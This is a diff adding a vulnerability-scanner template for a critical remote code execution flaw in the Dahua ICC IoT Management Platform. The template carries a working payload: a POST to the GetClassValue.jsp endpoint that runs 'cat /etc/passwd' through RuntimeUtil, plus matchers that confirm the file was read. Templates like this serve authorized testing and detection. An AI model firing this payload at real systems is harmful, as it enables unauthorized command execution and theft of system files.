@@ -1,0 +1,35 @@
+id: poc-yaml-dahua-icc-getclassvalue-rce
+info:
+  name: Dahua ICC Intelligent IoT Management Platform GetClassValue RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: POST
+    path:
+      - "/evo-apigw/admin/API/Developer/GetClassValue.jsp"
+    headers:
+      Content-Type: application/json
+    body: |-
+      {
+          "data": {
+              "clazzName": "com.dahua.admin.util.RuntimeUtil",
+              "methodName": "syncexecReturnInputStream",
+              "fieldName": ["cat /etc/passwd"]
+          }
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"desc\":\"Success\""
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "filename="
